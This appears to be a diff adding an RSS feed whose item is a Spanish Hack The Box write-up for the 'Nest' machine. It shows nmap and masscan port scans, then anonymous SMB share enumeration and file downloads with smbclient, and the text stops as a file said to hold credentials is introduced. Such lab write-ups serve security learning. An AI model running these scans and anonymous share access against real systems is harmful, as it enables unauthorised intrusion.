@@ -1,0 +1,998 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" 
+  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
+  xmlns:dc="http://purl.org/dc/elements/1.1/" 
+  xmlns:atom="http://www.w3.org/2005/Atom" 
+  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
+  xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>HQK Reporting on sckull</title>
+    <link>https://sckull.github.io/tags/hqk-reporting/</link>
+    <description>Recent content in HQK Reporting on sckull</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>es</language>
+    <copyright>©{year}, All Rights Reserved</copyright>
+    <lastBuildDate>Thu, 04 Jun 2020 00:00:00 +0000</lastBuildDate>
+    <sy:updatePeriod>daily</sy:updatePeriod>
+    <sy:updateFrequency>daily</sy:updateFrequency>
+    
+        <atom:link href="https://sckull.github.io/tags/hqk-reporting/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    
+
+      
+      <item>
+        <title>Hack The Box - Nest</title>
+        <link>https://sckull.github.io/posts/nest/</link>
+        <pubDate>Thu, 04 Jun 2020 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Thu, 04 Jun 2020 00:00:00 +0000</atom:modified>
+        <guid>https://sckull.github.io/posts/nest/</guid>
+        <description>Nest es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
+        <content:encoded>&lt;p&gt;Nest es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;
+
+
+
+
+  
+
+
+
+  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
+    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/nest/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
+  &lt;/div&gt;
+
+&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Nombre&lt;/th&gt;
+&lt;th&gt;Nest&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;OS&lt;/td&gt;
+&lt;td&gt;Windows&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Puntos&lt;/td&gt;
+&lt;td&gt;20&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Dificultad&lt;/td&gt;
+&lt;td&gt;Facil&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;IP&lt;/td&gt;
+&lt;td&gt;10.10.10.178&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Maker&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/158833&#34;&gt;VbScrub&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h2&gt;
+&lt;p&gt;Escaneo de puertos tcp/udp y servicios con masscan y nmap, encontramos el puerto samba (445) y el puerto 2386 abiertos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting masscan 1.0.5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2020-01-29 04:56:39 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+Discovered open port 4386/tcp on 10.10.10.178                                  
+Discovered open port 445/tcp on 10.10.10.178
+
+&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Tue Jan 28 22:23:24 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.178&lt;/span&gt;
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.178
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.34s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;65533&lt;/span&gt; filtered ports
+PORT     STATE SERVICE       VERSION
+445/tcp  open  microsoft-ds?
+4386/tcp open  unknown
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; fingerprint-strings: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Reporting Service V1.2
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Reporting Service V1.2
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Unrecognised &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Help: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Reporting Service V1.2
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     This service allows users to run queries against databases using the legacy HQK format
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     AVAILABLE COMMANDS ---
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     LIST
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     SETDIR &amp;lt;Directory_Name&amp;gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     RUNQUERY &amp;lt;Query_ID&amp;gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     DEBUG &amp;lt;Password&amp;gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    HELP &amp;lt;Command&amp;gt;
+
+... &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;snip&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ...
+
+Host script results:
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: 1m15s
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled but not required
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2020-01-29T04:29:38
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: 2020-01-29T03:11:05
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue Jan 28 22:29:02 2020 -- 1 IP address (1 host up) scanned in 338.05 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;smbclient&#34;&gt;SMBCLIENT&lt;/h2&gt;
+&lt;p&gt;Listamos los SHARENAMES de la maquina, vemos que existe Data, Secure$ y Users, en los cuales tenemos acceso.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/nest# smbclient -L 10.10.10.178
+Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;oot&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	Data            Disk      
+	IPC$            IPC       Remote IPC
+	Secure$         Disk      
+	Users           Disk      
+SMB1 disabled -- no workgroup available
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Utilizamos el SHARENAME Data con un usuario &amp;lsquo;anonimo&amp;rsquo; y sin contraseña para enumerar los archivos, encontramos dentro de Shared dos archivos de texto.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/nest# smbclient &lt;span class=&#34;se&#34;&gt;\\\\&lt;/span&gt;10.10.10.178&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;Data
+Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;oot&lt;span class=&#34;s1&#34;&gt;&amp;#39;s password: 
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Try &amp;#34;help&amp;#34; to get a list of possible commands.
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \&amp;gt; dir
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  .                                   D        0  Wed Aug  7 16:53:46 2019
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  ..                                  D        0  Wed Aug  7 16:53:46 2019
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  IT                                  D        0  Wed Aug  7 16:58:07 2019
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  Production                          D        0  Mon Aug  5 15:53:38 2019
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  Reports                             D        0  Mon Aug  5 15:53:44 2019
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  Shared                              D        0  Wed Aug  7 13:07:51 2019
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		10485247 blocks of size 4096. 6449704 blocks available
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \&amp;gt; cd IT
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \IT\&amp;gt; dir
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;NT_STATUS_ACCESS_DENIED listing \IT\*
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \IT\&amp;gt; cd ..
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \&amp;gt; cd Production
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;dsmb: \Production\&amp;gt; dir
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;NT_STATUS_ACCESS_DENIED listing \Production\*
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \Production\&amp;gt; cd ..
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \&amp;gt; cd Reports
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \Reports\&amp;gt; dir
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;NT_STATUS_ACCESS_DENIED listing \Reports\*
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \Reports\&amp;gt; cd ..
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \&amp;gt; cd Shared
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;dsmb: \Shared\&amp;gt; dir
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  .                                   D        0  Wed Aug  7 13:07:51 2019
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  ..                                  D        0  Wed Aug  7 13:07:51 2019
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  Maintenance                         D        0  Wed Aug  7 13:07:32 2019
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  Templates                           D        0  Wed Aug  7 13:08:07 2019
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		10485247 blocks of size 4096. 6449704 blocks available
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \Shared\&amp;gt; cd Maintenance
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \Shared\Maintenance\&amp;gt; dir
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  .                                   D        0  Wed Aug  7 13:07:32 2019
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  ..                                  D        0  Wed Aug  7 13:07:32 2019
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  Maintenance Alerts.txt              A       48  Mon Aug  5 17:01:44 2019
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		10485247 blocks of size 4096. 6449704 blocks available
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \Shared\Maintenance\&amp;gt; get &amp;#34;Maintenance Alerts.txt&amp;#34;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;getting file \Shared\Maintenance\Maintenance Alerts.txt of size 48 as Maintenance Alerts.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \Shared\Maintenance\&amp;gt; cd ..\Templates
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \Shared\Templates\&amp;gt; dir
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  .                                   D        0  Wed Aug  7 13:08:07 2019
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  ..                                  D        0  Wed Aug  7 13:08:07 2019
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  HR                                  D        0  Wed Aug  7 13:08:01 2019
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  Marketing                           D        0  Wed Aug  7 13:08:06 2019
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		10485247 blocks of size 4096. 6449704 blocks available
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \Shared\Templates\&amp;gt; dir HR
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  HR                                  D        0  Wed Aug  7 13:08:01 2019
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		10485247 blocks of size 4096. 6449704 blocks available
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \Shared\Templates\&amp;gt; cd HR
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \Shared\Templates\HR\&amp;gt; dir
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  .                                   D        0  Wed Aug  7 13:08:01 2019
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  ..                                  D        0  Wed Aug  7 13:08:01 2019
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  Welcome Email.txt                   A      425  Wed Aug  7 16:55:36 2019
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		10485247 blocks of size 4096. 6449704 blocks available
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \Shared\Templates\HR\&amp;gt; get &amp;#39;&lt;/span&gt;Welcome Email.txt&lt;span class=&#34;s1&#34;&gt;&amp;#39;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Shared\Templates\HR\&amp;#39;&lt;/span&gt;Welcome
+smb: &lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;hared&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;emplates&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;R&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; get &lt;span class=&#34;s2&#34;&gt;&amp;#34;Welcome Email.txt&amp;#34;&lt;/span&gt;
+getting file &lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;hared&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;emplates&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;R&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;elcome Email.txt of size &lt;span class=&#34;m&#34;&gt;425&lt;/span&gt; as Welcome Email.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.6 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 0.1 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+smb: &lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;hared&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;emplates&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;R&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ..&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;arketing
+smb: &lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;hared&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;emplates&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;arketing&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; dir
+  .                                   D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Wed Aug  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 13:08:06 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
+  ..                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Wed Aug  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 13:08:06 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
+
+		&lt;span class=&#34;m&#34;&gt;10485247&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;6449704&lt;/span&gt; blocks available
+smb: &lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;hared&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;emplates&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;arketing&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Los archivos que encontramos son archivos de texto que contienen notas, en una de ellas encontramos las credenciales de uno de los usuarios de la maquina.&lt;/p&gt;
+&lt;p&gt;Maintenance Alerts.txt:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;There is currently no scheduled maintenance work
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Welcome Email.txt:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
